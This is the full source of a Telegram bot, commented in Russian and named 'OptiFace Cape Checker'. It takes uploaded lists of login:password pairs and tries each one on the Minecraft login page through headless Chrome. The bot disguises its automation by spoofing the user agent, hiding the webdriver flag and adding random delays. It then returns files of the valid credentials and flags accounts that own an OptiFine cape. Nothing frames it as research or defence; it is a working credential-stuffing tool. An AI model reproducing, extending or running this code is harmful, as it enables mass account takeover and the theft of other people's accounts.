import os
import sys
import logging
import asyncio
import aiofiles
import time
import random
import tempfile
from datetime import datetime
from pathlib import Path

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

import requests

# Настройка логирования
logging.basicFormat = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
logging.basicConfig(
    format=logging.basicFormat,
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Конфиг из переменных окружения
TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    logger.error("❌ BOT_TOKEN не найден в переменных окружения!")
    sys.exit(1)

ADMIN_IDS = os.environ.get('ADMIN_IDS', '').split(',')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

# Статистика
bot_stats = {
    'total': 0,
    'valid': 0,
    'invalid': 0,
    'capes': 0,
    'migrated': 0,
    'start_time': datetime.now()
}

class SeleniumChecker:
    """Проверка аккаунтов через реальный браузер"""
    
    def __init__(self):
        self.driver = None
        self.temp_dir = tempfile.mkdtemp()
        logger.info(f"📁 Временная директория: {self.temp_dir}")
    
    def setup_driver(self):
        """Настраивает Chrome для работы на Railway"""
        chrome_options = Options()
        
        # Критически важные настройки для Railway
        chrome_options.add_argument('--headless=new')
        chrome_options.add_argument('--no-sandbox')
        chrome_options.add_argument('--disable-dev-shm-usage')
        chrome_options.add_argument('--disable-gpu')
        chrome_options.add_argument('--window-size=1920,1080')
        
        # Отключаем безопасность
        chrome_options.add_argument('--disable-web-security')
        chrome_options.add_argument('--disable-features=VizDisplayCompositor')
        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
        chrome_options.add_argument('--ignore-certificate-errors')
        chrome_options.add_argument('--allow-running-insecure-content')
        
        # Маскировка
        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        # Для производительности
        chrome_options.add_argument('--disable-extensions')
        chrome_options.add_argument('--disable-notifications')
        chrome_options.add_argument('--disable-popup-blocking')
        
        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        # Временная директория
        chrome_options.add_argument(f'--user-data-dir={self.temp_dir}/chrome-data')
        
        # На Railway ChromeDriver обычно в /usr/local/bin/chromedriver
        chromedriver_path = '/usr/local/bin/chromedriver'
        
        if not os.path.exists(chromedriver_path):
            # Пробуем другие пути
            alternative_paths = [
                '/usr/bin/chromedriver',
                '/usr/lib/chromium-browser/chromedriver',
                'chromedriver'
            ]
            
            for path in alternative_paths:
                if os.path.exists(path):
                    chromedriver_path = path
                    break
        
        try:
            service = Service(chromedriver_path)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            
            # Маскируем WebDriver
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            logger.info("✅ Chrome успешно запущен")
            return True
            
        except Exception as e:
            logger.error(f"❌ Ошибка запуска Chrome: {e}")
            
            # Последняя попытка - без указания пути
            try:
                logger.info("🔄 Пробую запустить без указания пути...")
                self.driver = webdriver.Chrome(options=chrome_options)
                logger.info("✅ Chrome запущен без указания пути")
                return True
            except Exception as e2:
                logger.error(f"❌ Фатальная ошибка: {e2}")
                return False
    
    async def check_account(self, login, password):
        """Проверяет аккаунт"""
        
        if not self.driver:
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Не могу запустить Chrome'
                }
        
        # Проверка что драйвер жив
        try:
            self.driver.current_url
        except:
            logger.warning("⚠️ Драйвер умер, перезапускаю...")
            self.close()
            if not self.setup_driver():
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Не могу перезапустить Chrome'
                }
        
        try:
            logger.info(f"🔍 Проверяю: {login[:20]}...")
            
            # Загружаем страницу входа
            self.driver.get('https://www.minecraft.net/en-us/login')
            
            # Ждем загрузку
            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            time.sleep(random.uniform(2, 4))
            
            # Проверяем не Microsoft ли
            if 'login.live.com' in self.driver.current_url:
                logger.info(f"🔄 Microsoft: {login[:20]}")
                return {
                    'login': login,
                    'password': password,
                    'status': 'migrated',
                    'error': 'Microsoft'
                }
            
            # Ищем поля ввода
            try:
                # Поле email/логин
                email_selectors = [
                    "input[type='email']",
                    "input[name='email']",
                    "#email",
                    "input[type='text']"
                ]
                
                email_input = None
                for selector in email_selectors:
                    try:
                        email_input = WebDriverWait(self.driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if not email_input:
                    return {
                        'login': login,
                        'status': 'error',
                        'error': 'Не найдено поле email'
                    }
                
                # Поле пароля
                password_input = self.driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                
                # Вводим данные
                email_input.clear()
                email_input.send_keys(login)
                time.sleep(random.uniform(0.5, 1.5))
                
                password_input.clear()
                password_input.send_keys(password)
                time.sleep(random.uniform(0.5, 1.5))
                
                # Кнопка входа
                submit_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                submit_button.click()
                
                # Ждем результат
                time.sleep(5)
                
                # Проверяем результат
                current_url = self.driver.current_url
                page_source = self.driver.page_source
                
                # Успешный вход
                if any(x in current_url for x in ['dashboard', 'profile', 'minecraft.net']):
                    # Получаем ник
                    username = await self.extract_username()
                    
                    # Проверяем плащ
                    has_cape = await self.check_optifine_cape(username)
                    
                    return {
                        'login': login,
                        'password': password,
                        'username': username,
                        'status': 'valid',
                        'has_cape': has_cape
                    }
                
                # Ошибка входа
                if 'error' in page_source.lower() or 'invalid' in page_source.lower():
                    return {
                        'login': login,
                        'status': 'invalid',
                        'error': 'Неверный логин/пароль'
                    }
                
                # Microsoft
                if 'microsoft' in page_source.lower() or 'login.live.com' in current_url:
                    return {
                        'login': login,
                        'status': 'migrated',
                        'error': 'Microsoft'
                    }
                
            except NoSuchElementException as e:
                logger.error(f"Элемент не найден: {e}")
                return {
                    'login': login,
                    'status': 'error',
                    'error': 'Страница изменилась'
                }
            
        except TimeoutException:
            logger.error("Таймаут загрузки")
            return {
                'login': login,
                'status': 'error',
                'error': 'Таймаут'
            }
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {
                'login': login,
                'status': 'error',
                'error': str(e)[:50]
            }
    
    async def extract_username(self):
        """Извлекает ник"""
        try:
            # Пробуем разные селекторы
            selectors = [
                ".profile-name",
                ".username",
                "[data-username]",
                ".gamertag",
                ".user-info"
            ]
            
            for selector in selectors:
                try:
                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                    for el in elements:
                        if el.text and 2 < len(el.text) < 20:
                            return el.text.strip()
                except:
                    pass
            
            # Пробуем через JavaScript
            username = self.driver.execute_script("""
                return localStorage.getItem('username') || 
                       localStorage.getItem('user') || 
                       'unknown';
            """)
            
            return username or "unknown"
        except:
            return "unknown"
    
    async def check_optifine_cape(self, username):
        """Проверяет плащ OptiFine"""
        if not username or username == 'unknown':
            return False
        
        try:
            cape_url = f"https://optifine.net/capes/{username}.png"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            response = requests.get(cape_url, headers=headers, timeout=5)
            
            if response.status_code == 200:
                size = len(response.content)
                if size > 500:  # Нормальный плащ > 500 байт
                    logger.info(f"🔥 Найден плащ у {username}")
                    return True
            return False
        except:
            return False
    
    def close(self):
        """Закрывает браузер"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            finally:
                self.driver = None

# Создаем глобальный экземпляр
checker = SeleniumChecker()

async def process_file(file_path, update, context):
    """Обработка файла"""
    results = {
        'valid': [],
        'capes': [],
        'invalid': [],
        'migrated': [],
        'errors': []
    }
    
    msg = await update.message.reply_text(
        "🔄 **Запускаю Chrome и начинаю проверку...**\n"
        "⏳ Это займет время..."
    )
    
    try:
        # Читаем файл
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        # Парсим аккаунты
        lines = content.strip().split('\n')
        accounts = []
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
                
            # Пробуем разные разделители
            for separator in [':', ';', '|']:
                if separator in line:
                    parts = line.split(separator, 1)
                    if len(parts) == 2 and parts[0] and parts[1]:
                        accounts.append((parts[0].strip(), parts[1].strip()))
                        break
        
        total = len(accounts)
        
        if total == 0:
            await msg.edit_text("❌ **Нет аккаунтов в файле**")
            return
        
        await msg.edit_text(
            f"📥 **Файл:** {update.message.document.file_name}\n"
            f"📊 **Аккаунтов:** {total}\n\n"
            f"🔄 **Проверяю...**"
        )
        
        start_time = time.time()
        
        # Проверяем каждый аккаунт
        for i, (login, password) in enumerate(accounts, 1):
            # Обновляем прогресс каждые 3 аккаунта
            if i % 3 == 0 or i == total:
                elapsed = time.time() - start_time
                minutes = int(elapsed // 60)
                seconds = int(elapsed % 60)
                
                await msg.edit_text(
                    f"📊 **Прогресс:** {i}/{total}\n"
                    f"🔥 **Плащей:** {len(results['capes'])}\n"
                    f"✅ **Рабочих:** {len(results['valid'])}\n"
                    f"⏱ **Время:** {minutes}м {seconds}с\n\n"
                    f"🔄 **Проверяю:** {login[:15]}..."
                )
            
            # Проверка
            result = await checker.check_account(login, password)
            
            # Сортируем
            if result['status'] == 'valid':
                results['valid'].append(result)
                if result.get('has_cape'):
                    results['capes'].append(result)
                    bot_stats['capes'] += 1
                bot_stats['valid'] += 1
            elif result['status'] == 'migrated':
                results['migrated'].append(result)
                bot_stats['migrated'] += 1
                bot_stats['invalid'] += 1
            elif result['status'] == 'invalid':
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            else:
                results['errors'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            
            # Задержка
            await asyncio.sleep(random.uniform(2, 4))
        
        # Сохраняем результаты
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Файл с плащами
        if results['capes']:
            cape_file = f"🔥_ПЛАЩИ_{len(results['capes'])}шт_{timestamp}.txt"
            async with aiofiles.open(cape_file, 'w', encoding='utf-8') as f:
                await f.write("🔥 АККАУНТЫ С ПЛАЩАМИ OPTIFINE 🔥\n\n")
                for acc in results['capes']:
                    await f.write(
                        f"Логин: {acc['login']}\n"
                        f"Пароль: {acc['password']}\n"
                        f"Ник: {acc.get('username', 'неизвестно')}\n"
                        f"{'='*40}\n\n"
                    )
            
            with open(cape_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=cape_file,
                    caption=f"🔥 **Плащей: {len(results['capes'])}**"
                )
            os.remove(cape_file)
        
        # Файл с валидными
        if results['valid']:
            valid_file = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(valid_file, 'w', encoding='utf-8') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            
            with open(valid_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=valid_file,
                    caption=f"✅ **Рабочих: {len(results['valid'])}**"
                )
            os.remove(valid_file)
        
        # Итог
        elapsed = time.time() - start_time
        minutes = int(elapsed // 60)
        seconds = int(elapsed % 60)
        
        await update.message.reply_text(
            f"✅ ПРОВЕРКА ЗАВЕРШЕНА!\n\n"
            f"📊 Статистика:\n"
            f"• Всего: {total}\n"
            f"• ✅ Рабочих: {len(results['valid'])}\n"
            f"• 🔥 С плащами: {len(results['capes'])}\n"
            f"• ❌ Неверных: {len(results['invalid'])}\n"
            f"• 🔄 Microsoft: {len(results['migrated'])}\n"
            f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
            f"⏱ Время: {minutes}м {seconds}с"
        )
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)[:100]}")
    finally:
        if os.path.exists(file_path):
            os.remove(file_path)

# Команды
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Старт"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    uptime = datetime.now() - bot_stats['start_time']
    hours = int(uptime.seconds // 3600)
    minutes = int((uptime.seconds // 60) % 60)
    
    keyboard = [
        [InlineKeyboardButton("📊 Стата", callback_data='stats')],
        [InlineKeyboardButton("❓ Помощь", callback_data='help')]
    ]
    
    await update.message.reply_text(
        f"👋 OptiFace Cape Checker\n\n"
        f"🔍 Проверка через браузер\n\n"
        f"📥 Отправь .txt файл\n"
        f"с логин:пароль\n\n"
        f"📊 Статистика:\n"
        f"• Проверено: {bot_stats['total']}\n"
        f"• Найдено плащей: {bot_stats['capes']}\n\n"
        f"⏱ Работаю: {hours}ч {minutes}мин",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Кнопки"""
    query = update.callback_query
    await query.answer()
    
    if query.data == 'stats':
        uptime = datetime.now() - bot_stats['start_time']
        hours = int(uptime.seconds // 3600)
        minutes = int((uptime.seconds // 60) % 60)
        
        await query.edit_message_text(
            f"📊 СТАТИСТИКА\n\n"
            f"Всего: {bot_stats['total']}\n"
            f"✅ Рабочих: {bot_stats['valid']}\n"
            f"❌ Битых: {bot_stats['invalid']}\n"
            f"🔥 С плащами: {bot_stats['capes']}\n"
            f"🔄 Microsoft: {bot_stats['migrated']}\n\n"
            f"⏱ Аптайм: {hours}ч {minutes}мин"
        )
    
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ КАК ПОЛЬЗОВАТЬСЯ\n\n"
            "1️⃣ Создай .txt файл\n"
            "2️⃣ В каждой строке: логин:пароль\n"
            "3️⃣ Отправь файл боту\n\n"
            "📌 Пример:\n"
            "`user@gmail.com:pass123`\n\n"
            "⚠️ Важно:\n"
            "• Проверка медленная\n"
            "• Многие аккаунты переехали на Microsoft"
        )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Получение файла"""
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Нужен .txt файл")
        return
    
    if doc.file_size > 10 * 1024 * 1024:
        await update.message.reply_text(f"❌ Файл > 10 МБ ({doc.file_size / 1024 / 1024:.1f} МБ)")
        return
    
    try:
        await update.message.reply_text(
            f"📥 Файл получен: {doc.file_name}\n"
            f"📦 Размер: {doc.file_size / 1024:.1f} КБ\n\n"
            f"🔄 Запускаю Chrome..."
        )
        
        file = await context.bot.get_file(doc.file_id)
        path = f"temp_{update.effective_user.id}_{doc.file_name}"
        await file.download_to_drive(path)
        await process_file(path, update, context)
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await update.message.reply_text(f"❌ Ошибка: {str(e)[:100]}")

def main():
    """Запуск"""
    print("=" * 50)
    print("🚀 ЗАПУСК OptiFace CAPE CHECKER")
    print("=" * 50)
    print(f"📊 Python: {sys.version}")
    print(f"🤖 Bot Token: {TOKEN[:10]}...")
    print(f"👑 Админы: {ADMIN_IDS}")
    print("=" * 50)
    
    # Создаем приложение
    app = Application.builder().token(TOKEN).build()
    
    # Добавляем обработчики
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("✅ БОТ ЗАПУЩЕН! Жду файлы...")
    
    try:
        app.run_polling()
    except KeyboardInterrupt:
        print("\n👋 Остановка...")
    finally:
        checker.close()
        print("👋 Chrome закрыт")

if __name__ == '__main__':
    main()